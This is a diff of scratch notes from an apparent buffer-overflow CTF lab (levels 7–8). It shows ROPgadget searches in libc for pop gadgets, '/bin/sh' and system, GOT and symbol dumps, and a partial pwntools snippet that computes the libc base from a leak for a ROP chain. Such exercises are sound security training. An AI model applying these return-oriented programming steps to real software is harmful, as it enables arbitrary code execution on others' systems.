@@ -10,3 +10,104 @@ base pointer rbp: 0x7fff02bc8c40
 
 0x7ffdce89b198:	94377960985024
 0x7ffd8055c0e8:	93904106910144
+
+================ 7 =============
+ropium> find rax = 0x3b
+0x0000000000036174 : pop rax ; ret // ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep 'pop rax'
+
+0x00000000001b45bd : /bin/sh // ROPgadget --binary ./usr/lib/x86_64-linux-gnu/libc-2.31.so --string "/bin/sh"
+find rdi = 0x1b45bd
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep 'pop rdi'
+0x0000000000023b6a : pop rdi ; ret
+
+# The function "system" in libc is located at 0x7f4a558cf290
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --string "chmod"
+0x0000000000016db0 : chmod
+0x0000000000017901 : chmod
+0x0000000000017988 : chmod
+0x00000000001eedc1 : chmod
+0x00000000001ef558 : chmod
+
+    hacker@buffer-overflow-level-7:~$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --string "system"
+    Strings information
+    ============================================================
+    0x0000000000014e0f : system
+    0x00000000000150e8 : system
+    0x00000000001b3d59 : system
+    0x00000000001b485d : system
+    0x00000000001b49c5 : system
+    0x00000000001b4a32 : system
+    0x00000000001b5288 : system
+    0x00000000001b5640 : system
+    0x00000000001b5fb1 : system
+    0x00000000001b8ea4 : system
+    0x00000000001b93b2 : system
+    0x00000000001b93d6 : system
+    0x00000000001b9534 : system
+    0x00000000001b9558 : system
+    0x00000000001bacdd : system
+
+[0x55bf2c75b020] puts@GLIBC_2.2.5  →  0x55bf2c758040
+
+00000000000010f0 <puts@plt>:
+    10f0:	f3 0f 1e fa          	endbr64 
+    10f4:	f2 ff 25 25 2f 00 00 	bnd jmpq *0x2f25(%rip)        # 4020 <puts@GLIBC_2.2.5>
+
+
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 10
+ 
+[0x55bf2c75b018] putchar@GLIBC_2.2.5  →  0x55bf2c758030
+[0x55bf2c75b020] puts@GLIBC_2.2.5  →  0x55bf2c758040
+[0x55bf2c75b028] strlen@GLIBC_2.2.5  →  0x55bf2c758050
+[0x55bf2c75b030] setbuf@GLIBC_2.2.5  →  0x7f9a64074ad0
+[0x55bf2c75b038] printf@GLIBC_2.2.5  →  0x55bf2c758070
+[0x55bf2c75b040] __assert_fail@GLIBC_2.2.5  →  0x55bf2c758080
+[0x55bf2c75b048] memset@GLIBC_2.2.5  →  0x55bf2c758090
+[0x55bf2c75b050] close@GLIBC_2.2.5  →  0x55bf2c7580a0
+[0x55bf2c75b058] read@GLIBC_2.2.5  →  0x55bf2c7580b0
+[0x55bf2c75b060] dlsym@GLIBC_2.2.5  →  0x55bf2c7580c0
+gef➤  x 0x55bf2c75b020
+0x55bf2c75b020 <puts@got.plt>:	0x2c758040
+gef➤  x 0x55bf2c758040
+0x55bf2c758040:	0xfa1e0ff3
+gef➤  
+
+
+hacker@buffer-overflow-level-7:/challenge$ objdump -T /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep puts
+0000000000084420 g    DF .text	00000000000001dc  GLIBC_2.2.5 _IO_puts
+0000000000084420  w   DF .text	00000000000001dc  GLIBC_2.2.5 puts
+0000000000124330 g    DF .text	00000000000004f4  GLIBC_2.2.5 putspent
+0000000000126000 g    DF .text	00000000000002d8  GLIBC_2.10  putsgent
+0000000000082ce0  w   DF .text	0000000000000180  GLIBC_2.2.5 fputs
+0000000000082ce0 g    DF .text	0000000000000180  GLIBC_2.2.5 _IO_fputs
+000000000008e320  w   DF .text	000000000000009f  GLIBC_2.2.5 fputs_unlocked
+
+
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep 'pop rsi'
+0x000000000002601f : pop rsi ; ret
+
+
+hacker@buffer-overflow-level-7:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+   237: 0000000000153ae0   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@@GLIBC_2.2.5
+   619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+hacker@buffer-overflow-level-7:~$ ^C
+readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep chmod
+
+
+
+===================== 8 notes ======================
+pop_rdi = base + 0x23b6a 
+pop_rsi = base + 0x2601f 
+pop_rdx = base + 0x142c92 
+pop_rax = base + 0x36174
+syscall = base + 0x2284d
+
+base = int(leak[:-1],16) - 0x23f90 - 0xF3# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
+
+
+p.recvuntil(b"is: ")
+leak = p.recvline()
